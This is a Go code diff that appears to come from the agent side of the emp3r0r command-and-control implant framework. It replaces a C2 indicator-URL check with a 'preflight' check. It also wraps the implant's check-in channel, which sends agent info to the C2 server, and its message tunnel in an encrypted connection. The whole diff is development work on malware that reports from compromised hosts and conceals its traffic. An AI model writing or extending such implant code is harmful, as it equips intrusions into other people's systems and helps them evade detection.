@@ -5,14 +5,10 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io"
-	"net"
-	"net/http"
-	"net/url"
 	"os"
 	"os/signal"
 	"strings"
 	"sync"
-	"time"
 
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
@@ -23,6 +19,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -50,7 +47,11 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 		return err
 	}
 	defer conn.Close()
-	out := cbor.NewEncoder(conn)
+
+	// Global Encryption: Wrap connection
+	secureConn := transport.NewSecureConn(conn)
+
+	out := cbor.NewEncoder(secureConn)
 	err = out.Encode(info)
 	if err == nil {
 		logging.Println("Checked in")
@@ -58,41 +59,15 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	return err
 }
 
-// CheckC2Condition check common.RuntimeConfig.CCIndicator for conditional C2 connetion
+// CheckC2Condition check preflight
 func CheckC2Condition(proxy string) bool {
-	logging.Printf("Checking CCIndicator: %s", common.RuntimeConfig.CCIndicatorURL)
-	t := &http.Transport{
-		Dial: (&net.Dialer{
-			Timeout:   60 * time.Second,
-			KeepAlive: 30 * time.Second,
-		}).Dial,
-		TLSHandshakeTimeout: 60 * time.Second,
+	// If Preflight not enabled, return true (Pass)
+	if !common.RuntimeConfig.PreflightEnabled {
+		return true
 	}
-	if proxy != "" && strings.HasPrefix(def.Transport, "HTTP2") {
-		proxyUrl, err := url.Parse(proxy)
-		if err != nil {
-			logging.Fatalf("invalid proxy: %v", err)
-		}
-		t.Proxy = http.ProxyURL(proxyUrl)
-		logging.Printf("CheckC2Condition: using proxy %s", proxy)
-	}
-	client := http.Client{
-		Transport: t,
-		Timeout:   30 * time.Second,
-	}
-	resp, err := client.Get(common.RuntimeConfig.CCIndicatorURL)
-	if err != nil {
-		logging.Printf("CheckC2Condition: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
-		return false
-	}
-	_, err = io.ReadAll(resp.Body)
-	if err != nil {
-		logging.Printf("CheckC2Condition: %s: %v", common.RuntimeConfig.CCIndicatorURL, err)
-		return false
-	}
-	defer resp.Body.Close()
 
-	return true
+	// Use Preflight Client
+	return preflight.Check(common.RuntimeConfig)
 }
 
 func catchInterruptAndExit(ctx context.Context, cancel context.CancelFunc) {
@@ -114,9 +89,12 @@ var HandShakes sync.Map // map[string]bool
 
 // MsgTunneler use the connection (conn)
 func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) error {
+	// Global Encryption: Wrap connection
+	secureConn := transport.NewSecureConn(conn)
+
 	var (
-		in  = cbor.NewDecoder(conn)
-		out = cbor.NewEncoder(conn)
+		in  = cbor.NewDecoder(secureConn)
+		out = cbor.NewEncoder(secureConn)
 	)
 	go catchInterruptAndExit(ctx, cancel)
 	defer func() {
